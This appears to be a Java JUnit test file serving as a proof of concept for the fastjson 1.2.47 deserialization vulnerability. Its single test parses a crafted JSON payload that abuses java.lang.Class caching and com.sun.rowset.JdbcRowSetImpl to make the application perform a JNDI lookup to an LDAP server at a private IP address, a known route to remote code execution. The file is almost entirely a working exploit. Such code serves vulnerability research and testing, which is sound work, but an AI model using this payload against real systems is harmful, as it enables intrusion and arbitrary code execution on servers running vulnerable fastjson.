import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_47 {
    @Test
    public void demo() throws Exception{
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_47 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.16.132:1389/siflky\",\"autoCommit\":true}}";
        Object parse = JSON.parse(v1_2_47);
    }
}
